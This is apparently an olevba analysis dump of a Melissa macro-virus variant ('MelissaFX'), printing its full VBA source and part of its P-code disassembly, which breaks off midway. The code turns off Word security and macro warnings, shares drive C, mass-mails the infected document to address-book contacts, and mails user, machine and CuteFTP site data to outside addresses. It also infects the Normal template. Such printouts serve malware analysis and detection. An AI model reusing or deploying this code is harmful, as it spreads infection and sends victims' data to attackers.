olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MelissaFX.cls 
in file: Virus.MSWord.Melissa.y - OLE stream: 'Macros/VBA/MelissaFX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
Private Sub Document_Open()
Randomize
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (5 - 5): Options.VirusProtection = (5 - 5): Options.SaveNormalPrompt = (5 - 5)
End If
ShareDriveC
DisableCtrlAltDelete (True)
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissaFX") <> 1 Then _
DoMail (Int(Rnd * 30) + 30) / 100, True
DoInf
DisableCtrlAltDelete (False)
End Sub
Private Function DisableCtrlAltDelete(bDisabled As Boolean)
    x = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Function
Private Function DoMail(Percent, Info As Boolean)
Dim UDasOutlook, DasMapiName, MyMail, MyInfo, oFolder
Set UDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UDasOutlook.GetNamespace("MAPI")
If UDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        Set MyMail = UDasOutlook.CreateItem(0)
        TotList = AddyBook.AddressEntries.Count
        If TotList > 10 Then
         TotMail = Int(TotList * Percent)
         tmp = TotMail - 1
         AdrBegin = Int(Rnd * (TotList - tmp)) + 1
         AdrStop = AdrBegin + tmp
        Else
         AdrBegin = 1
         AdrStop = TotList
        End If
        For x = AdrBegin To AdrStop
            EAdr = AddyBook.AddressEntries(x)
            MyMail.Recipients.Add EAdr
        Next x
          Set oFolder = DasMapiName.GetDefaultFolder(6)
          RNItem = Int(Rnd * oFolder.items.Count) + 1
        With MyMail
         .Attachments.Add ActiveDocument.FullName
         .Importance = Int(Rnd * 2) + 1
         .DeleteAfterSubmit = True
          If oFolder.items.Count > 0 And Int(Rnd * 3) + 1 > 1 Then _
         .body = oFolder.items(RNItem).body
         .Subject = SmartSubj
         .Send
        End With
    Next y
    If Info = True Then
     DefltCuteFTP = "c:\progra~1\cuteftp\tree.dat"
        If Dir(DefltCuteFTP) = "" Then
         With Application.FileSearch
          .FileName = "tree.dat"
          .LookIn = "c:\progra~1\"
          .SearchSubFolders = True
          .Execute
          CuteFTP = .FoundFiles(1)
         End With
        Else
          CuteFTP = DefltCuteFTP
        End If
        If CuteFTP <> "" Then
         tmpkey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
         tmpkey2 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\"
         Usr = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "Username")
         PC = System.PrivateProfileString("", tmpkey2 & "ComputerName\ComputerName", "ComputerName")
         Org = System.PrivateProfileString("", tmpkey, "RegisteredOrganization")
         TZone = System.PrivateProfileString("", tmpkey2 & "TimeZoneInformation", "StandardName")
         Set MyInfo = UDasOutlook.CreateItem(0)
         With MyInfo
          .Recipients.Add "infx" & "@iname.com"
          .Recipients.Add "fafx" & "@fastermail.com"
          .Recipients.Add "apfx" & "@apexmail.com"
          .DeleteAfterSubmit = True
          .Subject = "Usr:" & Usr & " - PC:" & PC & " - Org:" & Org & " - Zone:" & TZone & " (" & ActiveDocument.Name & ")"
          .Attachments.Add CuteFTP
          .Send
         End With
    End If
    End If
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissaFX") = 1
End Function
Private Function SmartSubj()
Dim Word(1 To 3, 1 To 6) As String
Word(1, 1) = "Hello!": Word(2, 1) = "Hi,"
Word(1, 2) = "Here": Word(2, 2) = "I think this": Word(3, 2) = "Gee...Guess this"
Word(1, 3) = "is": Word(2, 3) = "used to be": Word(3, 3) = "are"
Word(1, 4) = "that": Word(2, 4) = "the": Word(3, 4) = "your"
Word(1, 5) = "file": Word(2, 5) = "document": Word(3, 5) = ".doc"
Word(1, 6) = "you requested": Word(2, 6) = "they asked"
For i = 1 To 6
x = Int(Rnd * 3) + 1
SmartSubj = SmartSubj & Word(x, i) & " "
Next i
End Function
Private Function DoInf()
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 1
If ADI1.Name <> "MelissaFX" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "MelissaFX"
DoAD = True
End If
If NTI1.Name <> "MelissaFX" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "MelissaFX"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Close()"
ToInfect.CodeModule.DeleteLines ADCL - 3
ToInfect.CodeModule.InsertLines ADCL - 3, "Document_Close"
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Open()"
ToInfect.CodeModule.DeleteLines NTCL - 3
ToInfect.CodeModule.InsertLines NTCL - 3, "Document_Open"
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Function
Private Function ShareDriveC()
 ValString = 1
 ValBinary = 3
 ValDWord = 4
 HKEY_LOCAL_MACHINE = &H80000002
 Key1 = "Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Flags", ValDWord, "770"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm1enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm2enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Path", ValString, "C:\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Remark", ValString, "MelissaFX"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Type", ValDWord, "0"
End Function
Private Sub WriteRegistry(ByVal Group As Long, ByVal Section As String, ByVal Key As String, ByVal ValType As Long, ByVal Value As Variant)
Dim lResult As Long
Dim lKeyValue As Long
Dim InLen As Long
Dim lNewVal As Long
Dim sNewVal As String
On Error Resume Next
lResult = RegCreateKey(Group, Section, lKeyValue)
If ValType = 4 Or ValType = 3 Then
   lNewVal = CLng(Value)
   If ValType = 4 Then InLen = 4
   lResult = RegSetValueExLong(lKeyValue, Key, 0&, ValType, lNewVal, InLen)
Else
   If ValType = 1 Then Value = Value + Chr(0)
   sNewVal = Value
   InLen = Len(sNewVal)
   lResult = RegSetValueExString(lKeyValue, Key, 0&, 1&, sNewVal, InLen)
End If
lResult = RegFlushKey(lKeyValue)
lResult = RegCloseKey(lKeyValue)
End Sub
Private Sub ViewVBCode()
End Sub
Private Sub AutoExit()
Document_Open
End Sub
'Melissa modified, !helob aisyalaM



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.y
' ===============================================================================
' Module streams:
' Macros/VBA/MelissaFX - 14499 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	FuncDefn (Private Declare Function RegCreateKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function RegSetValueExLong Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function RegSetValueExString Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #4:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nextDocument 
' Line #6:
' 	FuncDefn (Private Sub Document_Open())
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #14:
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	ArgsCall ShareDriveC 0x0000 
' Line #17:
' 	LitVarSpecial (True)
' 	Paren 
' 	ArgsCall DisableCtrlAltDelete 0x0001 
' Line #18:
' 	LineCont 0x0004 0E 00 00 00
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0009 "MelissaFX"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x001E 
' 	Add 
' 	Paren 
' 	LitDI2 0x0064 
' 	Div 
' 	LitVarSpecial (True)
' 	ArgsCall DoMail 0x0002 
' 	EndIf 
' Line #19:
' 	ArgsCall DoInf 0x0000 
' Line #20:
' 	LitVarSpecial (False)
' 	Paren 
' 	ArgsCall DisableCtrlAltDelete 0x0001 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Function DisableCtrlAltDelete(bDisabled As Boolean, id_FFFE As Variant))
' Line #23:
' 	LitDI2 0x0061 
' 	Ld bDisabled 
' 	LitDI2 0x0001 
' 	Coerce (Str) 
' 	LitDI2 0x0000 
' 	ArgsLd SystemParametersInfo 0x0004 
' 	St x 
' Line #24:
' 	EndFunc 
' Line #25:
' 	FuncDefn (Private Function DoMail(Percent, Info As Boolean, id_FFFE As Variant))
' Line #26:
' 	Dim 
' 	VarDefn UDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn MyMail
' 	VarDefn MyInfo
' 	VarDefn oFolder
' Line #27:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UDasOutlook 
' Line #28:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UDasOutlook 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set DasMapiName 
' Line #29:
' 	Ld UDasOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #31:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DasMapiName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #32:
' 	SetStmt 
' 	Ld y 
' 	Ld DasMapiName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set MyMail 
' Line #34:
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St TotList 
' Line #35:
' 	Ld TotList 
' 	LitDI2 0x000A 
' 	Gt 
' 	IfBlock 
' Line #36:
' 	Ld TotList 
' 	Ld Percent 
' 	Mul 
' 	FnInt 
' 	St TotMail 
' Line #37:
' 	Ld TotMail 
' 	LitDI2 0x0001 
' 	Sub 
' 	St tmp 
' Line #38:
' 	Ld Rnd 
' 	Ld TotList 
' 	Ld tmp 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St AdrBegin 
' Line #39:
' 	Ld AdrBegin 
' 	Ld tmp 
' 	Add 
' 	St AdrStop 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	St AdrBegin 
' Line #42:
' 	Ld TotList 
' 	St AdrStop 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld AdrBegin 
' 	Ld AdrStop 
' 	For 
' Line #45:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St EAdr 
' Line #46:
' 	Ld EAdr 
' 	Ld MyMail 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #47:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	SetStmt 
' 	LitDI2 0x0006 
' 	Ld DasMapiName 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	Set oFolder 
' Line #49:
' 	Ld Rnd 
' 	Ld oFolder 
' 	MemLd items 
' 	MemLd Count 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RNItem 
' Line #50:
' 	StartWithExpr 
' 	Ld MyMail 
' 	With 
' Line #51:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	MemLdWith Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #52:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith Importance 
' Line #53:
' 	LitVarSpecial (True)
' 	MemStWith DeleteAfterSubmit 
' Line #54:
' 	LineCont 0x0004 14 00 09 00
' 	Ld oFolder 
' 	MemLd items 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld RNItem 
' 	Ld oFolder 
' 	ArgsMemLd items 0x0001 
' 	MemLd body 
' 	MemStWith body 
' 	EndIf 
' Line #55:
' 	Ld SmartSubj 
' 	MemStWith Subject 
' Line #56:
' 	ArgsMemCallWith Send 0x0000 
' Line #57:
' 	EndWith 
' Line #58:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld Info 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitStr 0x001C "c:\progra~1\cuteftp\tree.dat"
' 	St DefltCuteFTP 
' Line #61:
' 	Ld DefltCuteFTP 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #62:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #63:
' 	LitStr 0x0008 "tree.dat"
' 	MemStWith FileName 
' Line #64:
' 	LitStr 0x000C "c:\progra~1\"
' 	MemStWith LookIn 
' Line #65:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #66:
' 	ArgsMemCallWith Execute 0x0000 
' Line #67:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St CuteFTP 
' Line #68:
' 	EndWith 
' Line #69:
' 	ElseBlock 
' Line #70:
' 	Ld DefltCuteFTP 
' 	St CuteFTP 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld CuteFTP 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #73:
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	St tmpkey 
' Line #74:
' 	LitStr 0x0034 "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\"
' 	St tmpkey2 
' Line #75:
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_LOCAL_MACHINE\Network\Logon"
' 	LitStr 0x0008 "Username"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Usr 
' Line #76:
' 	LitStr 0x0000 ""
' 	Ld tmpkey2 
' 	LitStr 0x0019 "ComputerName\ComputerName"
' 	Concat 
' 	LitStr 0x000C "ComputerName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PC 
' Line #77:
' 	LitStr 0x0000 ""
' 	Ld tmpkey 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Org 
' Line #78:
' 	LitStr 0x0000 ""
' 	Ld tmpkey2 
' 	LitStr 0x0013 "TimeZoneInformation"
' 	Concat 
' 	LitStr 0x000C "StandardName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TZone 
' Line #79:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set MyInfo 
' Line #80:
' 	StartWithExpr 
' 	Ld MyInfo 
' 	With 
' Line #81:
' 	LitStr 0x0004 "infx"
' 	LitStr 0x000A "@iname.com"
' 	Concat 
' 	MemLdWith Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #82:
' 	LitStr 0x0004 "fafx"
' 	LitStr 0x000F "@fastermail.com"
' 	Concat 
' 	MemLdWith Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #83:
' 	LitStr 0x0004 "apfx"
' 	LitStr 0x000D "@apexmail.com"
' 	Concat 
' 	MemLdWith Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #84:
' 	LitVarSpecial (True)
' 	MemStWith DeleteAfterSubmit 
' Line #85:
' 	LitStr 0x0004 "Usr:"
' 	Ld Usr 
' 	Concat 
' 	LitStr 0x0006 " - PC:"
' 	Concat 
' 	Ld PC 
' 	Concat 
' 	LitStr 0x0007 " - Org:"
' 	Concat 
' 	Ld Org 
' 	Concat 
' 	LitStr 0x0008 " - Zone:"
' 	Concat 
' 	Ld TZone 
' 	Concat 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	MemStWith Subject 
' Line #86:
' 	Ld CuteFTP 
' 	MemLdWith Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #87:
' 	ArgsMemCallWith Send 0x0000 
' Line #88:
' 	EndWith 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0009 "MelissaFX"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #94:
' 	EndFunc 
' Line #95:
' 	FuncDefn (Private Function SmartSubj(id_FFFE As Variant))
' Line #96:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	VarDefn Word (As String)
' Line #97:
' 	LitStr 0x0006 "Hello!"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Hi,"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt Word 0x0002 
' Line #98:
' 	LitStr 0x0004 "Here"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000C "I think this"
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0010 "Gee...Guess this"
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsSt Word 0x0002 
' Line #99:
' 	LitStr 0x0002 "is"
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000A "used to be"
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0003 "are"
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	ArgsSt Word 0x0002 
' Line #100:
' 	LitStr 0x0004 "that"
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0003 "the"
' 	LitDI2 0x0002 
' 	LitDI2 0x0004 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0004 "your"
' 	LitDI2 0x0003 
' 	LitDI2 0x0004 
' 	ArgsSt Word 0x0002 
' Line #101:
' 	LitStr 0x0004 "file"
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0008 "document"
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0004 ".doc"
' 	LitDI2 0x0003 
' 	LitDI2 0x0005 
' 	ArgsSt Word 0x0002 
' Line #102:
' 	LitStr 0x000D "you requested"
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsSt Word 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000A "they asked"
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsSt Word 0x0002 
' Line #103:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #104:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #105:
' 	Ld SmartSubj 
' 	Ld x 
' 	Ld i 
' 	ArgsLd Word 0x0002 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St SmartSubj 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndFunc 
' Line #108:
' 	FuncDefn (Private Function DoInf(id_FFFE As Variant))
' Line #109:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #110:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #111:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #112:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #113:
' 	LitDI2 0x0001 
' 	St BGN 
' Line #114:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0009 "MelissaFX"
' 	Ne 
' 	IfBlock 
' Line #115:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #116:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #117:
' 	LitStr 0x0009 "MelissaFX"
' 	Ld ADI1 
' 	MemSt New 
' Line #118:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0009 "MelissaFX"
' 	Ne 
' 	IfBlock 
' Line #121:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #122:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #123:
' 	LitStr 0x0009 "MelissaFX"
' 	Ld NTI1 
' 	MemSt New 
' Line #124:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #127:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #130:
' 	Loop 
' Line #131:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #132:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #133:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #134:
' 	Loop 
' Line #135:
' 	LitDI2 0x0007 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #136:
' 	LitDI2 0x0007 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #137:
' 	Ld ADCL 
' 	LitDI2 0x0003 
' 	Sub 
' 	Ld ToInfect 
